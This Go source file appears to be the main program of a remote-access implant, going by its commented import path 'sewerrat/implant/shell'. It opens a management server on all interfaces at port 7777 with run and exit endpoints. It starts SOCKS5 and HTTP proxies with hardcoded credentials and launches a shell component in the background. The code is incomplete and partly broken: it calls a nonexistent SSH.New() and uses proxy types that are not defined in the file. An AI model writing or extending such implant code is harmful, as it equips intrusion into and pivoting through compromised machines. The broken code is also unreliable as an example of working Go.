package main

import (
	"fmt"
	"log"
	"net/http"
	"strconv"
	// shell "fu3fi/sewerrat/implant/shell"
)

var SERVER_PORT int = 7777

var SOCKS5_PORT int = 4555
var HTTP_PORT int = 5764

var RUN_PATH string = "/"
var EXIT_PATH string = "/exit"

func Run(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("Success"))
}

func Shutdown(w http.ResponseWriter, r *http.Request) {
	log.Fatal()
}

type SSH struct {
	
}

type Shell interface {
	Port() int
	SetPort()
	New() Shell
}

func main() {

	go func() {
		var shell Shell = SSH.New()
		shell.Port()
	}()

	http.HandleFunc(RUN_PATH, Run)
	http.HandleFunc(EXIT_PATH, Shutdown)

	socks5Proxy := Socks5Proxy{SOCKS5_PORT, "nightcat", "myau"}
	httpProxy := HttpProxy{HTTP_PORT, "nightcat", "myau"}

	NewProxy(socks5Proxy, httpProxy)
	// fmt.Println(proxy)

	fmt.Println("[Manage Server]: start")
	err := http.ListenAndServe("0.0.0.0:"+strconv.Itoa(SERVER_PORT), nil)
	// err := http.ListenAndServeTLS(":8080", "cert.pem", "key.pem", nil)

	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
